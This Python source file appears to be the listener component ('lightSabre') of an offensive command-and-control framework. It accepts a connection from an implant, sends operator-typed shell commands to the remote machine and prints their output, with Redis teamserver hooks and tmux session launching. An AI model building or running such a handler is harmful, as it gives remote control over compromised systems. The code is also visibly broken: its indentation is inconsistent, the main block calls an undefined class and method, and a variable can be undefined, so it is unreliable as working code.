#!/usr/bin/python3
from socket import *
from .settings import r
import pexpect
import subprocess

class lightSabre():

	def __init__(self, teamserver, HOST, PORT):
			self.ts = teamserver
		self.h = HOST
		self.p = PORT
		self.lid = "%s:%s" % (HOST,PORT)
		self.channel = self.lid + '-cmd'
		self.pubsub = self.ts.pubsub()
		self.ts.lpush(self.lid, 'hostneame')
		self.result = self.lid + '-out'
		self.ts.publish('Listeners', self.lid)

	def screenList(self):
		print("Identify the session you want:")
		subprocess.call(['screen', '-ls'])
		s = input('Select the first four:')
		subprocess.call(["screen", '-r', s])
		

	def screenLightSabre(self):
		print('Starting the light-sabre listener in session')
		try:
					l = subprocess.check_output(['tmux', 'list-sessions'], shell=False)
					li = l.split('\n')
					n = []
					for i in li:
							if 'light-sabre' in i:
									n.append(i.split('light-sabre')[1])
					c = 0
					nu = []
					for i in n:
							if ':' not in i[0]:
									nu.append(i[0])
							else:
									nu.append(str(0))
					if nu:
							nn = str(int(max(nu)) + 1)
		except:
			l = 'empty' #No sessions
				# high number 
				if 'light-sabre' in l:
						print('already have one')
						subprocess.call(['/bin/bash', '-c', 'tmux new -s light-sabre%d "clear && /opt/Sabre-TOC/light-sabre/lightsabre-server.py "' % int(nn)])
						print('light-sabre%d' % int(nn))
				else:
						subprocess.call(['/bin/bash', '-c', 'tmux new -s light-sabre "clear && /opt/Sabre-TOC/light-sabre/lightsabre-server.py "'])

	def startNative(self): # Template to start migrating simple over to REDIS
		#HOST = ''                 # '' means bind to all interfaces
		#PORT = 443                #  port 
		# create our socket handler
		s = socket(AF_INET, SOCK_STREAM)
		# set is so that when we cancel out we can reuse port
		s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
		# bind to interface
		s.bind((self.h, self.p))
		# print we are accepting connections
		print("Listening on 0.0.0.0:%s" % str(self.p))
		# listen for only 10 connection
		s.listen(10)
		# accept connections
		conn, addr = s.accept()
		# print connected by ipaddress
		print('Connected by', addr)
		# receive initial connection
		data = conn.recv(1024)
		# start loop
		channel = self.channel
		result = self.result
		self.pubsub.subscribe(channel)
		#print channel
		print('Enter shell command or "quit" to quit:')
		print('Enter "back" to quit and leave the implant running:')
		while 1:
			#for item in self.pubsub.listen():
			#	command = item['data']
			#	if command == 1:
			#		command = 'hostname'
			#	break
			command = input("Shell: ")
			command = command + ' '
			# send shell command
			conn.send(str(command))
			# if we specify quit then kill implant, break out of loop and close socket
			if command == "quit ":
				conn.send(str(command)) 
				break
			# if we specify back then break out of loop and close socket
						if command == "back ": break
			# receive output from linux command
			data = conn.recv(1024)
			# print the output of the linux command
			print(data)
			#self.ts.publish(str(result), data)
		# close socket
		conn.close()

if __name__ == "__main__":
	#r = redis.Redis(host='localhost', port=6379)
	client = native(r, "0.0.0.0", 42)
	client.startNimple()

